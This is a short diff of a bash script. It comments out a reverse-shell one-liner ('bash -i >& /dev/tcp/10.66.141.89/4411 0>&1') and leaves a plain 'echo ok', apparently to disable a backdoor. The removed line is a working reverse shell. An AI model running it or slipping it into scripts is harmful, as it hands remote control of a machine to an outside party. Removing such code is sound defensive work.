@@ -1,4 +1,4 @@
 #!/bin/bash
 
-bash -i >& /dev/tcp/10.66.141.89/4411 0>&1
+#bash -i >& /dev/tcp/10.66.141.89/4411 0>&1
 echo ok
